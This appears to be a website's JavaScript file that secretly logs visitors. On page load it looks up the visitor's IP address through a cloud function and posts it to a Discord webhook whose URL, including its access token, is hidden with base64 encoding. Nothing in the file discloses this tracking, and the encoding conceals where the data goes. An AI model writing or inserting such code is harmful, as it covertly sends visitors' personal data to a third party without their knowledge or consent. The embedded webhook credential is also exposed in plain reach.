var userip = "null"
var url = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzMxNTg0NjY5NjgxMjU4NC94TEVMTkowa0xUTklUZFBwcFpXNktvQk1mR2p3dDNDOEQxT19BX0k3WGYyX2tBTjRYZmF2RHZhcVAwRHhiM0VDenpmWQ==')
$.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/getip", function (data) {
    userip = (data.ip);
    sendMessage(data.ip);
})

function sendMessage(ipText) {
    const request = new XMLHttpRequest();
    request.open("POST", url);

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "NaN",
      avatar_url: "",
      content: "Ip: " + ipText
    }

    request.send(JSON.stringify(params));
  }